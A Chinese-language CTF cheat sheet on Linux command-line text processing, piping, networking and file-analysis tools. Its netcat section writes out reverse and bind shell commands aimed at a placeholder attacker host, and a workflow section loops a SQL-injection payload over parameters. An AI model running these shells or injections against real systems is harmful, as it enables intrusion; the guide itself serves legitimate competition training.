---
category: "方法论"
tags: ["Linux", "命令行", "Shell", "文本处理", "管道"]
difficulty: "入门"
---

# Linux命令行速查与高级技巧

## 1. 概述

在CTF竞赛中，高效使用Linux命令行可以显著提升解题速度。本文聚焦CTF场景下最实用的命令行技巧，从基础文本处理到高级管道组合，覆盖Web/Pwn/Reverse/Crypto/Misc各类题目的命令行需求。

### 使用场景分布

| 场景 | 常用命令 | 频率 |
|------|---------|------|
| 文本处理/日志分析 | grep, sed, awk, cut, sort, uniq | 极高 |
| 网络通信/数据传输 | nc, curl, wget, socat | 极高 |
| 编码转换 | base64, xxd, od, iconv | 高 |
| 文件操作 | find, strings, file, hexdump | 高 |
| 进程/系统监控 | ps, strace, ltrace, lsof | 中 |
| 管道组合 | \|, xargs, tee, >, < | 贯穿始终 |

## 2. 核心原理

### 2.1 Linux管道与重定向精要

```
标准输入(stdin)  →  [程序]  →  标准输出(stdout)
   (fd=0)                       (fd=1)
                            标准错误(stderr)
                               (fd=2)

管道: command1 | command2   # stdout → stdin
重定向:
  command > file     # stdout → file (覆盖)
  command >> file    # stdout → file (追加)
  command < file     # file → stdin
  command 2> file    # stderr → file
  command &> file    # stdout+stderr → file (bash)
  command 2>&1       # stderr → stdout (合并)
```

### 2.2 文本处理三剑客协作模型

```
               grep                  sed                 awk
          ┌─────────────┐    ┌─────────────┐    ┌─────────────┐
数据流───>│   过滤行    │───>│   编辑行    │───>│   格式化列  │───> 结果
          │  (行选择)   │    │  (内容替换) │    │  (字段处理) │
          └─────────────┘    └─────────────┘    └─────────────┘

典型管道:
cat data.txt | grep "pattern" | sed 's/old/new/g' | awk '{print $1, $3}'
```

### 2.3 正则表达式速查

```
CTF场景常用正则:
.        任意单个字符
*        前一个字符重复0次或多次
+        前一个字符重复1次或多次
?        前一个字符重复0次或1次
{n}      前一个字符重复n次
{n,m}    前一个字符重复n到m次
^        行首
$        行尾
[...]    字符类 (如[a-zA-Z0-9])
[^...]   否定字符类
|        或
(...)    捕获组
\1,\2    反向引用

Perl兼容扩展 (grep -P):
\s       空白字符
\S       非空白字符
\d       数字
\D       非数字
\w       单词字符 [a-zA-Z0-9_]
\W       非单词字符
\b       单词边界
```

## 3. 关键技巧/检测方法

### 3.1 grep高级用法 (CTF场景)

```bash
# === 基础搜索 ===
grep "flag" file.txt                    # 搜索包含flag的行
grep -i "flag" file.txt                 # 忽略大小写
grep -v "comment" file.txt              # 反向选择（排除）

# === 递归搜索 ===
grep -r "TODO" ./source/                # 递归搜索目录
grep -rn "password" ./source/           # 显示行号
grep -rl "secret" ./source/             # 只显示文件名
grep -ri "api_key" ./source/ --include="*.php"   # 按文件类型过滤

# === 上下文控制 ===
grep -A 3 "error" log.txt              # 显示匹配行及后3行
grep -B 2 "flag" log.txt               # 显示匹配行及前2行
grep -C 5 "vulnerable" log.txt         # 显示匹配行及前后5行

# === 正则表达式 ===
grep -E "flag\{.+\}" file.txt          # 扩展正则(ERE)
grep -P "flag\{[a-f0-9]{32}\}" file.txt # Perl正则（PCRE）
grep -oP "flag\{[^}]+\}" file.txt      # 只输出匹配部分(-o)
grep -E "([0-9]{1,3}\.){3}[0-9]{1,3}" file.txt  # 提取IP地址

# === 多模式匹配 ===
grep -e "flag" -e "ctf" -e "secret" file.txt     # 匹配多个模式
grep -f patterns.txt file.txt         # 从文件读取模式

# === CTF常用场景 ===
# 1. 从源码中提取所有硬编码字符串
strings binary | grep -E "^[A-Za-z0-9_\-\.]{6,}$"

# 2. 从HTML中提取URL
grep -oP 'https?://[^\s"'\'']+' page.html | sort -u

# 3. 从日志中提取特定时间段
grep -E "^\[2024-06-01 1[0-2]:" access.log

# 4. 从JS文件中提取API key模式
grep -oP '(?:api[_-]?key|apikey|access[_-]?token)["\x27\s:=]+([A-Za-z0-9_\-\.]{20,})' *.js

# 5. 从二进制文件中搜索flag
strings -n 8 binary | grep -i "flag{"
```

### 3.2 sed高级用法 (CTF场景)

```bash
# === 基础替换 ===
sed 's/old/new/' file.txt              # 每行替换第一个匹配
sed 's/old/new/g' file.txt             # 全局替换
sed 's/old/new/2' file.txt             # 替换每行第2个匹配
sed 's/old/new/gi' file.txt            # 忽略大小写+全局

# === 行操作 ===
sed -n '5,10p' file.txt                # 打印第5-10行
sed '5,10d' file.txt                   # 删除第5-10行
sed '/pattern/d' file.txt              # 删除匹配行
sed '/start/,/end/d' file.txt          # 删除start到end之间的行

# === 高级替换 ===
# 使用捕获组
sed 's/\(.*\):\(.*\)/\2:\1/' file.txt   # 交换冒号两侧内容（基础正则）
sed -E 's/(.*):(.*)/\2:\1/' file.txt    # 扩展正则（更简洁）

# === CTF常用场景 ===
# 1. 提取URL参数值
echo "http://target/page?id=123&user=admin" | \
    sed 's/.*id=\([^&]*\).*/\1/'
# 输出: 123

# 2. 移除HTML标签
curl -s http://target | sed 's/<[^>]*>//g'

# 3. 格式化nmap输出
cat scan.txt | sed -n '/^PORT/,/^$/p' | sed '/^$/d'

# 4. 删除每行开头的空格和制表符
sed 's/^[[:space:]]*//' file.txt

# 5. 批量修改IP地址
sed -i 's/192\.168\.1\./10.10.10./g' config.txt

# 6. 在匹配行后插入内容
sed '/\[database\]/a host=localhost' config.ini

# 7. 在特定行前插入
sed '3i # New Comment' script.sh

# 8. JSON响应中提取值
echo '{"flag":"flag{test}","status":"ok"}' | \
    sed 's/.*"flag":"\([^"]*\)".*/\1/'
# 输出: flag{test}
```

### 3.3 awk高级用法 (CTF场景)

```bash
# === 基础 ===
awk '{print $1}' file.txt              # 打印第1列（默认空白分隔）
awk -F: '{print $1, $3}' /etc/passwd   # 以:为分隔符
awk -F, '{print NF}' data.csv          # 打印每行的字段数

# === 条件过滤 ===
awk '$3 > 100' data.txt                # 第3列大于100的行
awk '$1 ~ /^192/' log.txt              # 第1列以192开头
awk '$2 !~ /error/' log.txt            # 第2列不含error

# === 内置变量 ===
awk '{print NR, $0}' file.txt          # NR=行号
awk '{print NF, $0}' file.txt          # NF=字段数
awk '{print length($0), $0}' file.txt  # 行长度

# === 计算 ===
awk '{sum+=$3} END {print sum}' data.txt           # 第3列求和
awk '{print $1, $2/$3}' data.txt                   # 计算比值
awk '{count[$1]++} END {for(k in count) print k, count[k]}' log.txt  # 统计词频

# === CTF常用场景 ===
# 1. 解析nmap输出提取开放端口
awk '/^[0-9]+\/.*open/ {print $1}' scan.txt

# 2. 解析CSV获取特定列
awk -F, '{print "User:", $1, "Score:", $3}' users.csv

# 3. 统计访问IP
awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -10

# 4. 提取HTTP状态码统计
awk '{print $9}' access.log | sort | uniq -c | sort -rn

# 5. 从JSON中提取值（简单的）
echo '{"name":"admin","id":123}' | \
    awk -F'"name":"|","id":' '{print $2}'

# 6. 格式化输出
nmap -sV target | awk '/^[0-9]/ {printf "Port: %-10s Service: %s\n", $1, $3}'

# 7. 计算总大小
ls -l | awk '{sum+=$5} END {printf "Total: %.2f MB\n", sum/1024/1024}'
```

### 3.4 管道组合实战（CTF全流程案例）

```bash
# ===== Web题目完整命令行工作流 =====

# 1. 扫描→提取开放端口→保存
nmap -sV -p- target_ip | \
    awk '/^[0-9]/ && /open/ {print $1}' | \
    cut -d'/' -f1 | \
    tee open_ports.txt

# 2. 目录爆破→过滤有意义结果→按状态码分类
gobuster dir -u http://target -w wordlist.txt -q | \
    awk '{print $1, $2}' | \
    sort -k1 | \
    tee dirs_found.txt

# 3. 从JS文件中提取敏感信息
curl -s http://target/app.js | \
    grep -oP '["'\''](?:/api/|/admin/|/debug/)[^"'\'']*' | \
    sort -u | \
    while read endpoint; do
        echo "=== $endpoint ==="
        curl -s "http://target$endpoint" | head -3
    done

# 4. 批量测试SQL注入
cat params.txt | \
    while read param; do
        echo "Testing parameter: $param"
        curl -s "http://target/search?${param}=' OR '1'='1" | \
            grep -c "error\|syntax\|warning"
    done

# 5. 寻找所有备份文件
curl -s http://target/ | \
    grep -oP '(?:src|href|action)=["'\'']([^"'\'']+)' | \
    sed 's/.*=["'\'']//;s/["'\'']//' | \
    while read file; do
        for ext in bak ~ .old .save .orig; do
            status=$(curl -s -o /dev/null -w "%{http_code}" "http://target/${file}${ext}")
            [ "$status" = "200" ] && echo "[FOUND] ${file}${ext}"
        done
    done

# 6. 提取并解码JWT
curl -s http://target/ | \
    grep -oP 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' | \
    while read jwt; do
        echo "=== JWT Token ==="
        echo "$jwt" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
    done

# 7. 从二进制中提取所有可能的flag
strings -n 5 challenge.bin | \
    grep -E 'flag\{|ctf\{|FLAG\{' | \
    tee flags_found.txt

# 8. 批量解码Base64
cat encoded_data.txt | \
    while read line; do
        echo "$line" | base64 -d 2>/dev/null && echo ""
    done
```

### 3.5 高级管道技巧

```bash
# === tee - 同时输出到文件和stdout ===
command | tee output.txt                 # 保存到文件同时显示
command | tee -a output.txt              # 追加模式
command 2>&1 | tee output.txt            # 同时保存stderr
command | tee >(grep ERROR > errors.txt) > full_output.txt  # 分流输出

# === xargs - 将stdin转为命令参数 ===
find . -name "*.php" | xargs grep "flag"         # 在所有PHP文件中搜索
cat urls.txt | xargs -I{} curl -s {} | tee results.txt  # 批量请求
cat ips.txt | xargs -P 10 -I{} nmap -sV {}       # 并行扫描（10线程）
find . -type f | xargs -I{} sh -c 'echo "=== {} ==="; file "{}"'  # 复杂命令

# === 进程替换 ===
diff <(sort file1.txt) <(sort file2.txt)         # 比较两个排序后的文件
comm -12 <(sort file1.txt) <(sort file2.txt)     # 两个文件的交集
grep -f <(cut -d: -f1 /etc/passwd) log.txt       # 从命令输出读取模式

# === 子shell和命令组 ===
{ command1; command2; } > output.txt             # 将多个命令输出重定向
(cd /tmp && ls -la)                              # 在子shell中切换目录

# === Here Document ===
cat << 'EOF' > script.sh
#!/bin/bash
echo "This is a script"
EOF

# Here String (向命令传递字符串)
grep "pattern" <<< "search in this string"
base64 -d <<< "SGVsbG8gV29ybGQ="

# === 条件执行 ===
command1 && command2               # command1成功才执行command2
command1 || command2               # command1失败才执行command2
command1 && command2 || command3   # 三元表达式
[ -f flag.txt ] && cat flag.txt || echo "No flag found"

# === 后台和并行 ===
command &                          # 后台运行
command1 & command2 & wait         # 并行运行并等待全部完成
nohup long_running_command &       # 终端关闭后继续运行
```

### 3.6 网络与数据传输命令

```bash
# ===== nc (netcat) - CTF最常用的瑞士军刀 =====

# 基础连接
nc target_ip port                   # TCP连接
nc -u target_ip port                # UDP连接
nc -v target_ip port                # 详细输出

# 服务监听
nc -l -p 4444                       # 监听4444端口
nc -l -p 4444 -e /bin/bash          # 监听并绑定shell（反弹shell服务器端）
nc -l -p 4444 > received_file       # 接收文件

# 文件传输
nc -l -p 4444 < file_to_send        # 发送方
nc target_ip 4444 > received_file   # 接收方

# 端口扫描
nc -zv target_ip 1-1000             # 快速端口扫描
nc -zv -w 1 target_ip 80-90         # 带超时的端口扫描

# 反弹Shell
# 攻击者机器:
nc -l -p 4444
# 目标机器:
nc attacker_ip 4444 -e /bin/bash    # 传统方式
bash -i >& /dev/tcp/attacker_ip/4444 0>&1  # bash方式

# ===== curl - HTTP客户端 =====

# GET请求
curl http://target/                 # 基础GET
curl -v http://target/              # 显示详细信息
curl -I http://target/              # 只显示响应头
curl -L http://target/              # 跟随重定向

# POST请求
curl -X POST http://target/login \
    -d "username=admin&password=123"
curl -X POST http://target/api \
    -H "Content-Type: application/json" \
    -d '{"key":"value"}'
curl -X POST http://target/upload \
    -F "file=@/path/to/file"

# Cookie和Header
curl -b "session=abc123" http://target/
curl -H "X-Forwarded-For: 127.0.0.1" http://target/
curl -H "Authorization: Bearer token_here" http://target/api
curl -A "Custom User Agent" http://target/

# Cookie Jar (保存和加载)
curl -c cookies.txt http://target/login
curl -b cookies.txt http://target/dashboard

# 代理和超时
curl -x http://proxy:8080 http://target/
curl --connect-timeout 5 --max-time 10 http://target/

# 输出控制
curl -s http://target/              # 静默模式（不显示进度）
curl -o output.html http://target/  # 保存到文件
curl -w "\nHTTP Status: %{http_code}\nTime: %{time_total}s\n" http://target/

# ===== socat - nc的增强版 =====

# SSL连接
socat - openssl:target:443,verify=0

# 端口转发
socat TCP-LISTEN:8080,fork TCP:internal_host:80

# 创建伪终端
socat file:`tty`,raw,echo=0 tcp:target:4444

# 转发到文件
socat TCP-LISTEN:4444,fork STDOUT | tee capture.log

# ===== SSH (如果目标开启了SSH) =====

# 端口转发（本地转发）
ssh -L 8080:internal_host:80 user@target

# 动态转发（SOCKS代理）
ssh -D 1080 user@target

# 使用私钥登录
ssh -i private_key user@target

# 远程执行命令
ssh user@target "cat /flag"
ssh user@target "find / -name 'flag*' 2>/dev/null"
```

### 3.7 文件分析与处理命令

```bash
# ===== 文件识别 =====
file unknown_file                    # 识别文件类型
file -i unknown_file                 # 显示MIME类型
file -z compressed.gz                # 查看压缩文件内容类型
file -k suspicious_file              # 不停止在第一个匹配

# ===== 字符串提取 =====
strings binary                       # 提取可打印字符串（默认4字符以上）
strings -n 8 binary                  # 最小8字符
strings -t x binary                  # 显示字符串的十六进制偏移
strings -e l binary                  # 小端(little-endian)编码
strings -e b binary                  # 大端(big-endian)编码

# ===== 十六进制 =====
xxd file.bin                         # 十六进制查看
xxd file.bin | head -20              # 查看前20行
xxd -r hex.txt > file.bin            # 十六进制还原
xxd -p file.bin                      # 纯十六进制dump（连续）
od -A x -t x1z file.bin              # 八进制dump（带ASCII）
hexdump -C file.bin | head -30       # 经典hexdump

# ===== 查找命令 =====
find / -name "flag*" 2>/dev/null                 # 按名称查找
find / -type f -size +1M -size -10M 2>/dev/null  # 按大小查找
find . -type f -mtime -1                         # 最近24小时修改的文件
find . -name "*.php" -exec grep "flag" {} \;     # 查找并执行命令
find . -name "*.txt" -exec sed -i 's/old/new/g' {} \;  # 批量修改

# ===== 压缩/解压 =====
tar -czf archive.tar.gz directory/   # 创建tar.gz
tar -xzf archive.tar.gz              # 解压tar.gz
tar -xjf archive.tar.bz2             # 解压tar.bz2
tar -tf archive.tar.gz               # 列出内容（不解压）
zip -r archive.zip directory/        # 创建zip
unzip archive.zip                    # 解压zip
unzip -l archive.zip                 # 列出zip内容

# ===== 校验和 =====
md5sum file                          # MD5
sha1sum file                         # SHA1
sha256sum file                       # SHA256
md5sum file1 file2 | sort            # 比较多个文件的MD5
```

## 4. 常见误区与注意事项

### 4.1 常见错误

| 错误 | 说明 | 正确做法 |
|------|------|----------|
| `cat file | grep pattern` | 不必要的cat | `grep pattern file` |
| `grep pattern | wc -l` | 可替代 | `grep -c pattern` |
| 忘记处理stderr | 错误信息丢失 | 使用 `2>&1` 或 `|&` |
| 未加引号的变量扩展 | 空格导致参数分隔 | 始终加双引号：`"$var"` |
| `rm -rf /` 缺少目标 | 灾难性删除 | 始终检查路径，使用`rm -rf ./dirname/` |
| 无限循环中无sleep | CPU100% | 在循环中添加`sleep 0.1` |
| 大文件直接cat然后grep | 内存溢出 | 使用`grep pattern large_file`直接 |
| 管道末尾的命令非原子操作 | 部分数据丢失 | 使用临时文件或tee |

### 4.2 管道安全最佳实践

```bash
# 1. 在管道中间添加检查点
command1 | tee checkpoint1.txt | command2 | tee checkpoint2.txt | command3

# 2. 使用set -euo pipefail避免静默错误
set -euo pipefail  # -e: 任何命令失败则退出
                   # -u: 使用未定义变量则退出  
                   # -o pipefail: 管道中任何命令失败则整体失败

# 3. 处理大量数据时限制输出
command | head -1000  # 只看前1000行
command | tail -f      # 跟踪末尾

# 4. 时间较长的操作使用进度显示
pv large_file | command  # 显示数据流过进度

# 5. 在CTF环境中建议使用绝对路径
/usr/bin/python3 script.py  # 而非 python3 script.py
```

## 5. 实战示例

### 示例1：一键提取CTF Web服务的所有端点

```bash
#!/bin/bash
# extract_all_endpoints.sh - 从目标提取所有端点

TARGET="http://10.10.10.10"
OUTDIR="endpoint_discovery"
mkdir -p "$OUTDIR"

echo "[*] 开始端点发现..."

# 1. 从主页HTML中提取
curl -s "$TARGET" | \
    grep -oP '(?:src|href|action|content)=["\x27]([^"'\'' ]+)["\x27]' | \
    sed -E 's/.*=["\x27]//;s/["\x27]//' | \
    sort -u > "${OUTDIR}/html_endpoints.txt"

# 2. 从robots.txt提取
curl -s "${TARGET}/robots.txt" | \
    grep -oP '^[A-Za-z]+: /\S+' | \
    awk '{print "/"$2}' >> "${OUTDIR}/robots_endpoints.txt"

# 3. 从sitemap.xml提取
curl -s "${TARGET}/sitemap.xml" | \
    grep -oP '<loc>[^<]+</loc>' | \
    sed 's/<loc>//;s/<\/loc>//' | \
    sed "s|${TARGET}||" >> "${OUTDIR}/sitemap_endpoints.txt"

# 4. 下载所有JS文件并提取路径
curl -s "$TARGET" | \
    grep -oP 'src=["\x27]([^"'\'']*\.js[^"'\'']*)["\x27]' | \
    sed -E 's/src=["\x27]//;s/["\x27]//' | \
    sort -u > "${OUTDIR}/js_files.txt"

while read -r js_url; do
    [[ "$js_url" =~ ^https?:// ]] || js_url="${TARGET}${js_url}"
    curl -s "$js_url" 2>/dev/null | \
        grep -oP '["\x27/](?:api/|v[0-9]/|admin/|debug/)[a-zA-Z0-9_/.-]*["\x27]' | \
        tr -d '"'\'
done < "${OUTDIR}/js_files.txt" | \
    sort -u > "${OUTDIR}/js_endpoints.txt"

# 5. 合并所有端点并测试
cat "${OUTDIR}/"*_endpoints.txt "${OUTDIR}/"*.txt | \
    grep -E '^/' | sort -u > "${OUTDIR}/all_endpoints.txt"

echo "[*] 发现 $(wc -l < ${OUTDIR}/all_endpoints.txt) 个端点，开始测试..."

while read -r endpoint; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}${endpoint}")
    case $status in
        200) echo "[200] ${endpoint}" ;;
        301|302) echo "[$status] ${endpoint} -> redirect" ;;
        403) echo "[403] ${endpoint} -> forbidden" ;;
        401) echo "[401] ${endpoint} -> unauthorized" ;;
        500) echo "[500] ${endpoint} -> server error!" ;;
    esac
done < "${OUTDIR}/all_endpoints.txt" | \
    tee "${OUTDIR}/endpoint_results.txt"

echo "[+] 完成！结果: ${OUTDIR}/endpoint_results.txt"
```

### 示例2：命令行批量密码学操作

```bash
# ===== Base64全家桶 =====
echo "flag{test}" | base64                  # 编码: ZmxhZ3t0ZXN0fQo=
echo "ZmxhZ3t0ZXN0fQo=" | base64 -d         # 解码
echo "ZmxhZ3t0ZXN0fQo=" | base64 -d | base64 -w0   # 解码再编码(无换行)

# ===== URL编码/解码 =====
# Python一行流
echo "hello world" | python3 -c "import sys,urllib.parse;print(urllib.parse.quote(sys.stdin.read().strip()))"
# 输出: hello%20world

echo "hello%20world" | python3 -c "import sys,urllib.parse;print(urllib.parse.unquote(sys.stdin.read().strip()))"
# 输出: hello world

# ===== 字符统计 =====
echo "hello world" | fold -w1 | sort | uniq -c | sort -rn
# 找到出现频率最高的字符

# ===== 进制转换 =====
echo "obase=16; ibase=2; 10101100" | bc     # 二进制→十六进制
echo "obase=10; ibase=16; FF" | bc           # 十六进制→十进制
printf "%x" 255                               # 十进制→十六进制: ff
printf "%d" 0xFF                              # 十六进制→十进制: 255

# ===== 字符与ASCII互转 =====
printf "%d" "'A"                              # 字符→ASCII: 65
printf "\x41"                                 # ASCII→字符: A
awk 'BEGIN{printf "%c\n", 65}'               # ASCII→字符(awk): A

# ===== 批量异或 =====
python3 -c "
key = 0x42
data = b'hello'
result = bytes([b ^ key for b in data])
print(result.hex())
"

# ===== 哈希计算 =====
echo -n "admin" | md5sum                      # MD5
echo -n "admin" | sha1sum                     # SHA1
echo -n "admin" | sha256sum                   # SHA256
echo -n "admin" | openssl dgst -md5           # OpenSSL MD5

# ===== 频率分析 =====
python3 -c "
from collections import Counter
text = 'ciphertext_here'
freq = Counter(text)
for char, count in freq.most_common():
    print(f'{char}: {count}')
"
```

## 6. 相关知识点

- [02-离线环境搭建与工具预装策略](./02-离线环境搭建与工具预装策略.md) - Shell环境配置
- [03-信息收集与侦察方法论](./03-信息收集与侦察方法论.md) - 命令行扫描技巧
- [06-Python脚本模板与常用库](./06-Python脚本模板与常用库.md) - 当Shell不够用时转向Python
- [07-调试与故障排除方法论](./07-调试与故障排除方法论.md) - strace/ltrace调试
- [10-编码与进制转换速查](./10-编码与进制转换速查.md) - 编码转换命令
- [11-网络协议基础与抓包分析](./11-网络协议基础与抓包分析.md) - nc/curl深入使用
